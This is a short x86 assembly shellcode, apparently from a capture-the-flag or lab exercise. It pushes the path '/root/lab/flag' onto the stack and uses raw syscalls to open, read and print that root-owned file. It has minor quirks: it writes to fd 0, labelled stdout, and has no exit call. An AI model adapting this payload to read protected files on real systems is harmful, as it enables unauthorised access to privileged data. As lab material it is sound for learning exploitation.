section .text
global _start

_start:
		; push string '/root/lab/flag' onto stack (local flag). little endian
        push 0x00006761				; ag\x00\x00
        push 0x6c662f62				; b/fl
        push 0x616c2f74				; t/la
        push 0x6f6f722f				; /roo


        ; 5 sys_open('filepath', 0)
        mov ecx, 0                  ; 0 read-only | 1 write-only | 2 read-write
        mov ebx, esp	            ; beginning address of '/root/lab/flag'
        mov eax, 5
        int 0x80

        ; 3 sys_read(3, [address], size)
        mov edx, 200                ; size to read
        mov ecx, esp               	; read from ESP (/root/lab/flag)
        mov ebx, eax                ; open()'s returned fd loaded into EAX (3)
        int 0x80

        ; 4 sys_write(1, [address], size)
        mov edx, 200                ; size to read
        mov ecx, esp              	; file contents
        mov ebx, 0                  ; stdout
        mov eax, 4
        int 0x80
